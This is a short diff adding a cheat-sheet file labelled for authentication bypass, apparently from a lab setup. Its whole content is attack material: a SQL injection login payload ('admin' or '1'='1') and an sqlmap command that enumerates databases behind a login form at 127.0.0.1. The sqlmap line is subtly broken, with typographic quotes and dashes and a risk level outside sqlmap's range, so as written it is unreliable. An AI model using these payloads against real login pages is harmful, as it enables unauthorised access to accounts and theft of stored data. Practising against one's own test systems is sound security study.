@@ -1,0 +1,6 @@
+/* FOR AUTHENTICATION BYPASS*/
+
+username : admin' or '1'='1
+password : anything
+
+sqlmap -u “http://127.0.0.1/login.php” –data=”user=a&password=b&s=Submit” –dbs –risk 5 –level 3   
